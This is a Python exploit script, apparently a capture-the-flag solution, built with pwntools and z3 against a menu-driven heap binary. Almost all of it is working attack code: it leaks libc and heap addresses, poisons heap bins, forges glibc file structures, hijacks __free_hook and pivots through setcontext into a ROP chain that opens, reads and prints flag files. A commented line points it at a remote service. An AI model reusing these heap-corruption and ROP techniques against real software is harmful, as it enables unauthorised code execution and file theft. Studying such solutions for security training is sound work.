#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *
from z3 import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

remote_service = "192.168.1.105:8888"
remote_service = remote_service.strip().split(":")

filename = "./pwn"

e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	# lg("p.pid")
	# input()
	pass

def cmd(choice):
	ru(b'5.Exit\n')
	sl(i2b(choice))
def add(size):
	cmd(1)
	ru(b'Input size:\n')
	sl(i2b(size))
def edit(idx, data):
	cmd(2)
	ru(b'Input index:\n')
	sl(i2b(idx))
	ru(b'Input content:')
	sn(data)
def show(idx):
	cmd(3)
	ru(b'Input index:\n')
	sl(i2b(idx))
def delete(idx):
	cmd(4)
	ru(b'Input index:\n')
	sl(i2b(idx))
# def dec(a):
# 	z = a & ((1 << 17) - 1)
# 	z |= (((a >> 17) ^ z) & ((1 << 17) - 1)) << 17
# 	z &= 0xffffffff
# 	y = z >> 15 << 15
# 	y = (y >> 21) ^ z
# 	a = y & 0xf
# 	a |= (((y >> 4) & 1) ^ (a & 1)) << 4
# 	a |= (((y >> 5) & 1) ^ ((a + (a >> 1)) & 1)) << 5
# 	a |= (((y >> 6) & 1) ^ (((a >> 1) + (a >> 2) + (((a & 1) + ((a >> 1) & 1)) >> 1)) & 1)) << 6
# 	carry = ((a & 1) + ((a >> 1) & 1)) >> 1
# 	for i in range(7, 32):
# 		a |= (((y >> i) & 1) ^ (((a >> (i - 5)) + (a >> (i - 4)) + carry) & 1)) << i
# 		carry = (((a >> (i - 5)) & 1) + ((a >> (i - 4)) & 1) + carry) >> 1
# 	return a
def dec(a):
	a1 = BitVec('a1', 32)
	s = Solver()
	s.add( (a1 ^ LShR((a1 ^ (0x30 * a1)) , 0x15) ^ (0x30 * a1) ^ ((a1 ^ (0x30 * a1) ^ LShR((a1 ^ (0x30 * a1)) , 0x15)) << 17)) == a )
	print(s.check())
	res = s.model()
	x = res[a1].as_long()
	print(hex(x))
	return x

def get_res(a):
	for i in range(10):
		a = dec(a)
		# print(hex(a))
	print(hex(a))
	return a

while 1:
	p = process(filename)
	# p = remote(remote_service[0], int(remote_service[1]))
	try:
		add(0x428)
		add(0x420)
		add(0x418)
		add(0x4f0)
		add(0x4f0)
		add(0x4f0)  # 5
		delete(0)
		show(0)
		recv0 = get_res(int(ru(b'\n', "drop"), 16))
		recv1 = get_res(int(ru(b'\n', "drop"), 16))
		libc_base = (recv1 << 0x20) + recv0
		lg("libc_base")
		assert libc_base < (0x8000 << 0x20)
		assert (libc_base & 0xfff) == 0xc00
		libc_base = libc_base - 0x1e0c00

		delete(4)
		delete(3)
		show(3)
		recv0 = get_res(int(ru(b'\n', "drop"), 16))
		recv1 = get_res(int(ru(b'\n', "drop"), 16))
		heap_chunk = (recv1 << 0x20) + recv0
		heap_xor = (heap_chunk >> 12) + 1
		lg("heap_chunk")
		# debugPID()
		assert heap_chunk < (0x6000 << 0x20)
		assert (heap_chunk & 0xfff) == 0x290
		# debugPID()
		fastbinY = libc_base + 0x1e0bb0
		add(0x430)
		delete(2)
		edit(0, p64(libc_base+0x1e0ff0)*2 + p64(heap_chunk) + p64(libc_base + 0x1e3e78 - 0x20))
		add(0x520)

		delete(7)
		edit(7, p64(0x501^heap_xor))
		# edit(7, p64((libc_base+l.symbols["__free_hook"]) ^ heap_xor)*2)
		add(0x520)

		delete(5)
		edit(5, p64( (0x1e0e30+libc_base)^heap_xor ) )
		add(0x4f0)
		add(0x4f0)
		edit(10, (b'a'*8*11 + p64(libc_base+0x1e1320)).ljust(0x4e8, b"A") + p64(0x5f1))
		add(0x5e0)
		# b'a'*8*11 + p64(libc_base+0x1e17b0) + 
		payload = (b'a'*0x10*13 + p64(0) + p64(0x0000000001000081) + p64(libc_base+0x1e0ba0) + p64(0)+p64(1))
		payload += p64(0x21000)*2 + p64(libc_base+0x998e0) + p64(libc_base+0x9b170)+ p64(0)+ p64(libc_base+0x1ad1ee)+ p64(libc_base+0x1ad1ee)+ p64(libc_base+0x20328d1630)+ p64(libc_base+0x20328d162e)+ p64(0)+ p64(0)+ p64(0)+ p64(0x1)+ p64(0x2)+ p64(libc_base+0x1e4af8)+ p64(0)+ p64(0xffffffffffffffff)+ p64(libc_base+0x1b3878)+ p64(0)+ p64(libc_base+0x1dd740)+ p64(libc_base+0x1ddc80)+ p64(libc_base+0x1ddd00)+ p64(libc_base+0x1de580)+ p64(libc_base+0x1ddac0)+ p64(libc_base+0x1dda40)+ p64(0)+ p64(libc_base+0x1de240)+ p64(libc_base+0x1de2a0)+ p64(libc_base+0x1de320)+ p64(libc_base+0x1de3e0)+ p64(libc_base+0x1de460)+ p64(libc_base+0x1de4c0)+ p64(libc_base+0x1933c0)+ p64(libc_base+0x1924c0)+ p64(libc_base+0x192ac0)+ p64(libc_base+0x1ad88c)+ p64(libc_base+0x1ad88c)+ p64(libc_base+0x1ad88c)+ p64(libc_base+0x1ad88c)+ p64(libc_base+0x1ad88c)+ p64(libc_base+0x1ad88c)+ p64(libc_base+0x1ad88c)+ p64(libc_base+0x1ad88c)+ p64(libc_base+0x1ad88c)+ p64(libc_base+0x1ad88c)+ p64(libc_base+0x1ad88c)+ p64(libc_base+0x1ad88c)+ p64(libc_base+0x1ad88c)+ p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x1e15e0)+ p64(0)+ p64(0)+ p64(0)
		payload += p64(0xfbad2087)+p64(libc_base+0x1e1663)*7 + p64(libc_base+0x1e1664) + p64(0)*4 + p64(libc_base+0x1e16c0)+p64(2)+p64(0xffffffffffffffff)
		payload += p64(0)+p64(libc_base+0x1e3660)+p64(0xffffffffffffffff)+p64(0)+p64(libc_base+0x1e07a0)+p64(0)*6+p64(libc_base+l.symbols["_IO_file_jumps"])
		payload += p64(0xfbad2887) + p64(libc_base+0x1e1743)*7+p64(libc_base+0x1e1744)+p64(0)*4+p64(libc_base+0x1e09a0)+p64(1)+p64(0xffffffffffffffff)
		payload += p64(0xa000000)+p64(libc_base+0x1e3670)+p64(0xffffffffffffffff)+p64(0)+p64(libc_base+0x1e08a0)+p64(0)*3+p64(0xffffffff)+p64(0)*2+p64(libc_base+l.symbols["_IO_file_jumps"])
		payload += p64(libc_base+0x1e15e0)+ p64(libc_base+0x1e16c0)+ p64(libc_base+0x1e09a0)+ p64(0x5f1)
		lg("len(payload)")
		edit(11,  payload)
		edit(10, (b'a'*8*11 + p64(libc_base+0x1e17b0)))
		add(0x5e0)
		payload = p64(libc_base+0x18efa0)+ p64(libc_base+0x18f1d0)+ p64(libc_base+0x18f200)+ p64(libc_base+0x18f260)+ p64(libc_base+0x18f4b0)+ p64(libc_base+0x18f6b0)+ p64(libc_base+0x18f7a0)+ p64(libc_base+0x18f7d0)+ p64(libc_base+0x18f830)+ p64(libc_base+0x18f880)+ p64(libc_base+0x18fa10)+ p64(libc_base+0x18fa60)+ p64(libc_base+0x18fad0)+ p64(libc_base+0x18fb50)+ p64(libc_base+0x112eb0)+ p64(libc_base+0x18fb60)+ p64(libc_base+0x18fba0)+ p64(libc_base+0x13a420)+ p64(libc_base+0x18fc60)+ p64(libc_base+0x18fdc0)+ p64(libc_base+0x14b6a0)+ p64(libc_base+0x18fde0)+ p64(libc_base+0x18fe10)+ p64(libc_base+0x18fe40)+ p64(libc_base+0x18fe70)+ p64(libc_base+0x18fea0)+ p64(libc_base+0x190190)+ p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x8eaa0)+ p64(libc_base+0x714e0)+ p64(libc_base+0x8e0a0)+ p64(libc_base+0x8e0b0)+ p64(libc_base+0x8f880)+ p64(libc_base+0x8e110)+ p64(libc_base+0x8e390)+ p64(libc_base+0x8eb10)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8e700)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x8e890)+ p64(libc_base+0x8f9f0)+ p64(libc_base+0x8fa00)+ p64(libc_base+0x8f9d0)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x8f9e0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x83680)+ p64(libc_base+0x76e30)+ p64(libc_base+0x8e0a0)+ p64(libc_base+0x8e0b0)+ p64(libc_base+0x834c0)+ p64(libc_base+0x837f0)+ p64(libc_base+0x83ed0)+ p64(libc_base+0x8eb10)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8e700)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x83ae0)+ p64(libc_base+0x8f9f0)+ p64(libc_base+0x8fa00)+ p64(libc_base+0x8f9d0)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x8f9e0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)
		payload += p64(0)+ p64(0)+ p64(libc_base+0x8c100)+ p64(libc_base+0x8cf10)+ p64(libc_base+0x8cbc0)+ p64(libc_base+0x8e0b0)+ p64(libc_base+0x8f880)+ p64(libc_base+0x8b730)+ p64(libc_base+0x8e390)+ p64(libc_base+0x7f0e0)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8a6a0)+ p64(libc_base+0x8a530)+ p64(libc_base+0x7e240)+ p64(libc_base+0x7efc0)+ p64(libc_base+0x7eff0)+ p64(libc_base+0x7f040)+ p64(libc_base+0x7f0a0)+ p64(libc_base+0x8f9e0)+ p64(libc_base+0x8fa10)+ p64(libc_base+0x8fa20)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x8c100)+ p64(libc_base+0x8cf10)+ p64(libc_base+0x8cbc0)+ p64(libc_base+0x8e0b0)+ p64(libc_base+0x8f880)+ p64(libc_base+0x8b730)+ p64(libc_base+0x8e390)+ p64(libc_base+0x8a9d0)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8a6a0)+ p64(libc_base+0x8a530)+ p64(libc_base+0x7e240)+ p64(libc_base+0x8ba60)+ p64(libc_base+0x8afc0)+ p64(libc_base+0x8a770)+ p64(libc_base+0x80220)+ p64(libc_base+0x8afb0)+ p64(libc_base+0x8fa10)+ p64(libc_base+0x8fa20)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x8ff50)+ p64(libc_base+0x815d0)+ p64(libc_base+0x8fb50)+ p64(libc_base+0x8e0b0)+ p64(libc_base+0x8ff30)+ p64(libc_base+0x8e110)+ p64(libc_base+0x8e390)+ p64(libc_base+0x900b0)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8e700)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x8e890)+ p64(libc_base+0x8f9f0)+ p64(libc_base+0x8fa00)+ p64(libc_base+0x8f9d0)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x8f9e0)+ p64(libc_base+0x8fa10)+ p64(libc_base+0x8fa20)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x84a10)+ p64(libc_base+0x82dc0)+ p64(libc_base+0x84560)+ p64(libc_base+0x83700)+ p64(libc_base+0x849f0)+ p64(libc_base+0x837f0)+ p64(libc_base+0x83ed0)+ p64(libc_base+0x84b50)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8e700)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x83ae0)+ p64(libc_base+0x8f9f0)+ p64(libc_base+0x8fa00)+ p64(libc_base+0x8f9d0)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x8f9e0)+ p64(libc_base+0x8fa10)+ p64(libc_base+0x8fa20)+ p64(0)+ p64(0)+ p64(0x5f1)
		lg("len(payload)")
		edit(12, payload)
		edit(10, (b'a'*8*11 + p64(libc_base+0x1e1d10)))
		add(0x5e0)
		payload = p64(0)+ p64(0)+ p64(libc_base+0x84a10)+ p64(libc_base+0x845d0)+ p64(libc_base+0x84560)+ p64(libc_base+0x83700)+ p64(libc_base+0x849f0)+ p64(libc_base+0x837f0)+ p64(libc_base+0x83ed0)+ p64(libc_base+0x84b50)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8e700)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x83ae0)+ p64(libc_base+0x8f9f0)+ p64(libc_base+0x8fa00)+ p64(libc_base+0x8f9d0)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x8f9e0)+ p64(libc_base+0x8fa10)+ p64(libc_base+0x8fa20)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x8c100)+ p64(libc_base+0x86220)+ p64(libc_base+0x85e80)+ p64(libc_base+0x83700)+ p64(libc_base+0x834c0)+ p64(libc_base+0x866d0)+ p64(libc_base+0x8b3b0)+ p64(libc_base+0x855f0)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8a6d0)+ p64(libc_base+0x86530)+ p64(libc_base+0x7f820)+ p64(libc_base+0x8ba60)+ p64(libc_base+0x8afc0)+ p64(libc_base+0x8a770)+ p64(libc_base+0x8a690)+ p64(libc_base+0x8afb0)+ p64(libc_base+0x8fa10)+ p64(libc_base+0x8fa20)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x8c100)+ p64(libc_base+0x86220)+ p64(libc_base+0x85ec0)+ p64(libc_base+0x83700)+ p64(libc_base+0x834c0)+ p64(libc_base+0x866d0)+ p64(libc_base+0x8b3b0)+ p64(libc_base+0x855f0)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8a6d0)+ p64(libc_base+0x86530)+ p64(libc_base+0x7f820)+ p64(libc_base+0x8ba60)+ p64(libc_base+0x8afc0)+ p64(libc_base+0x8a770)+ p64(libc_base+0x8a740)+ p64(libc_base+0x8afb0)+ p64(libc_base+0x8fa10)+ p64(libc_base+0x8fa20)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x8c100)+ p64(libc_base+0x86220)+ p64(libc_base+0x84e30)+ p64(libc_base+0x83700)+ p64(libc_base+0x834c0)+ p64(libc_base+0x866d0)+ p64(libc_base+0x8b3b0)+ p64(libc_base+0x855f0)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8a6a0)+ p64(libc_base+0x86530)+ p64(libc_base+0x7f820)+ p64(libc_base+0x8ba60)+ p64(libc_base+0x8afc0)+ p64(libc_base+0x8a770)+ p64(libc_base+0x8a690)+ p64(libc_base+0x8afb0)+ p64(libc_base+0x8fa10)+ p64(libc_base+0x8fa20)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x86fc0)+ p64(libc_base+0x845d0)+ p64(libc_base+0x84560)+ p64(libc_base+0x83700)+ p64(libc_base+0x849f0)+ p64(libc_base+0x837f0)+ p64(libc_base+0x83ed0)+ p64(libc_base+0x84b50)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8e700)+ p64(libc_base+0x86f60)+ p64(libc_base+0x83ae0)+ p64(libc_base+0x8f9f0)+ p64(libc_base+0x8fa00)+ p64(libc_base+0x8f9d0)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x8f9e0)+ p64(libc_base+0x8fa10)+ p64(libc_base+0x8fa20)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x87c50)+ p64(libc_base+0x8fbb0)+ p64(libc_base+0x8fb50)+ p64(libc_base+0x8e0b0)+ p64(libc_base+0x8ff30)+ p64(libc_base+0x8e110)+ p64(libc_base+0x8e390)+ p64(libc_base+0x900b0)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8e700)+ p64(libc_base+0x87c00)+ p64(libc_base+0x8e890)+ p64(libc_base+0x8f9f0)+ p64(libc_base+0x8fa00)+ p64(libc_base+0x8f9d0)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x8f9e0)+ p64(libc_base+0x8fa10)+ p64(libc_base+0x8fa20)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x8ff50)+ p64(libc_base+0x88390)+ p64(libc_base+0x8fb50)+ p64(libc_base+0x8e0b0)+ p64(libc_base+0x8ff30)+ p64(libc_base+0x8e110)+ p64(libc_base+0x8e390)+ p64(libc_base+0x900b0)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8e700)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x8e890)+ p64(libc_base+0x8f9f0)+ p64(libc_base+0x8fa00)+ p64(libc_base+0x8f9d0)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x8f9e0)+ p64(libc_base+0x8fa10)+ p64(libc_base+0x8fa20)+ p64(0)+ p64(0)
		payload += p64(0x5f1)
		lg("len(payload)")
		edit(13, payload)
		edit(10, (b'a'*8*11 + p64(libc_base+0x1e2250)))
		add(0x5e0)
		payload = p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x885e0)+ p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x88530)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x8c100)+ p64(libc_base+0x8cf10)+ p64(libc_base+0x8ba90)+ p64(libc_base+0x8e0b0)+ p64(libc_base+0x8f880)+ p64(libc_base+0x8b730)+ p64(libc_base+0x8a7e0)+ p64(libc_base+0x8a620)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8a6d0)+ p64(libc_base+0x8a530)+ p64(libc_base+0x7e240)+ p64(libc_base+0x8ba60)+ p64(libc_base+0x8afc0)+ p64(libc_base+0x8a770)+ p64(libc_base+0x8a690)+ p64(libc_base+0x8afb0)+ p64(libc_base+0x8fa10)+ p64(libc_base+0x8fa20)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(libc_base+0x8c100)+ p64(libc_base+0x8cf10)+ p64(libc_base+0x8bc70)+ p64(libc_base+0x8e0b0)+ p64(libc_base+0x8f880)+ p64(libc_base+0x8b730)+ p64(libc_base+0x8b060)+ p64(libc_base+0x8b5e0)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8a6d0)+ p64(libc_base+0x8a780)+ p64(libc_base+0x7e240)+ p64(libc_base+0x8ba60)+ p64(libc_base+0x8afc0)+ p64(libc_base+0x8a770)+ p64(libc_base+0x8a740)+ p64(libc_base+0x8afb0)+ p64(libc_base+0x8fa10)+ p64(libc_base+0x8fa20)+ p64(0)+ p64(0)+ p64(0)
		payload += p64(0)+ p64(0)+ p64(libc_base+0x8c100)+ p64(libc_base+0x8cf10)+ p64(libc_base+0x8cbc0)+ p64(libc_base+0x8e0b0)+ p64(libc_base+0x8f880)+ p64(libc_base+0x8b730)+ p64(libc_base+0x8b3b0)+ p64(libc_base+0x8a9d0)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8a6a0)+ p64(libc_base+0x8a530)+ p64(libc_base+0x7e240)+ p64(libc_base+0x8ba60)+ p64(libc_base+0x8afc0)+ p64(libc_base+0x8a770)+ p64(libc_base+0x8a690)+ p64(libc_base+0x8afb0)+ p64(libc_base+0x8fa10)+ p64(libc_base+0x8fa20)+ p64(0)+ p64(0) +p64(0)
		payload += p64(0)+ p64(0)+ p64(libc_base+0x8ff50)+ p64(libc_base+0x8fbb0)+ p64(libc_base+0x8fb50)+ p64(libc_base+0x8e0b0)+ p64(libc_base+0x8ff30)+ p64(libc_base+0x8e110)+ p64(libc_base+0x8e390)+ p64(libc_base+0x900b0)+ p64(libc_base+0x8e820)+ p64(libc_base+0x8e700)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x8e890)+ p64(libc_base+0x8f9f0)+ p64(libc_base+0x8fa00)+ p64(libc_base+0x8f9d0)+ p64(libc_base+0x8ea90)+ p64(libc_base+0x8f9e0)+ p64(libc_base+0x8fa10)+ p64(libc_base+0x8fa20)+ p64(libc_base+0x8ef80)+ p64(0)+ p64(0)+ p64(libc_base+0xb419fef708)+ p64(0x1)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)+ p64(0)
		payload += p64(0x5f1)
		lg("len(payload)")
		edit(14, payload)
		edit(10, (b'a'*8*11 + p64(libc_base+0x1e2830)))
		add(0x5e0)
		payload = p64(0).ljust(0x5d8, b'\x00')
		payload += p64(0x5f1)
		lg("len(payload)")
		edit(15, payload)
		edit(10, (b'a'*8*11 + p64(libc_base+0x1e2e10)))
		add(0x5e0)
		payload = p64(0).ljust(0x5d8, b'\x00')
		payload += p64(0x5f1)
		lg("len(payload)")
		edit(16, payload)
		edit(10, (b'a'*8*11 + p64(libc_base+0x1e33f0)))
		add(0x5e0)
		payload = p64(0).ljust(0x5d8, b'\x00')
		payload += p64(0x5f1)
		lg("len(payload)")
		edit(17, payload)
		edit(10, (b'a'*8*11 + p64(libc_base+0x1e39d0)))
		add(0x5e0)
		payload = p64(0).ljust(0x5d8-0x1a0, b'\x00')
		payload += p64(0x5f1)
		lg("len(payload)")
		edit(18, payload)
		edit(10, (b'a'*8*11 + p64(libc_base+0x1e3e10)))
		add(0x5e0)

		magic_gadget = libc_base + 0x14a0a0
		free_hook_addr = libc_base + l.symbols['__free_hook']
		set_context = 0x52970 + libc_base
		pop_rax_ret = libc_base + 0x44c70
		pop_rdi_ret = libc_base + 0x28a55
		pop_rsi_ret = libc_base + 0x2a4cf
		pop_rdx_ret = libc_base + 0xc7f32
		p_rdx_r12_r = libc_base + 0x112a51
		read_f = libc_base + l.symbols["read"]
		write_f = libc_base + l.symbols["write"]
		syscall = libc_base + 0x6105a
		ret = libc_base + 0x26699

		heap_base = (heap_chunk & 0xfffffffffffff000)
		lg("heap_base")
		str_flag_addr = heap_base + 0x2a0 		# 0
		rw_addr = heap_base + 0x6d0 			# 1
		fake_frame_addr = free_hook_addr + 0x10
		debugPID()
		str_flag_addr2 = 0xb00 + heap_base

		edit(0, b"./flag\x00\x00")
		edit(2, b"./flag.txt\x00")
		rop_chain = b''
		rop_chain += p64(pop_rdi_ret) + p64(str_flag_addr) # name = "./flag"
		rop_chain += p64(pop_rsi_ret) + p64(0)
		rop_chain += p64(pop_rdx_ret) + p64(0)
		rop_chain += p64(pop_rax_ret) + p64(2) + p64(syscall) # sys_open
		rop_chain += p64(pop_rdi_ret) + p64(3) # fd = 3
		rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
		rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
		rop_chain += p64(libc_base + l.symbols["read"])
		rop_chain += p64(pop_rdi_ret) + p64(1) # fd = 1
		rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
		rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
		rop_chain += p64(libc_base + l.symbols["write"])
		rop_chain += p64(pop_rdi_ret) + p64(str_flag_addr2) # name = "./flag.txt"
		rop_chain += p64(pop_rsi_ret) + p64(0)
		rop_chain += p64(pop_rdx_ret) + p64(0)
		rop_chain += p64(pop_rax_ret) + p64(2) + p64(syscall) # sys_open
		rop_chain += p64(pop_rdi_ret) + p64(3) # fd = 3
		rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
		rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
		rop_chain += p64(libc_base + l.symbols["read"])
		rop_chain += p64(pop_rdi_ret) + p64(1) # fd = 1
		rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
		rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
		rop_chain += p64(libc_base + l.symbols["write"])


		frame = SigreturnFrame()
		frame.rax = 0
		frame.rdi = 0
		frame.rsp = fake_frame_addr + 0xF8		 	# 栈迁移到可控区域，即rop_chain开始的地址，这里直接把rop_chain跟在fake_frame后面了
		frame.rip = ret
		frame = bytes(frame).ljust(0xF8, b'\x00')

		payload  = p64(magic_gadget)				# 先跳到上述magic_gadget对rdx进行赋值
		payload += p64(fake_frame_addr)				# rdx的值，即fake_frame的起始地址		( mov rdx, qword ptr [rdi + 8]; )
		payload += b'\x00' * 0x20 					# 对应 ( call qword ptr [rdx + 0x20]; )，即( fake_frame_addr + 0x20 )
		payload += p64(libc_base + l.symbols["setcontext"] + 61)
		payload += frame[0x28:]						# 前面占位了0x20 + 8
		payload += rop_chain


		edit(19, payload)
		debugPID()
		delete(19)


		debugPID()

		irt()
	except Exception as e:
		p.close()
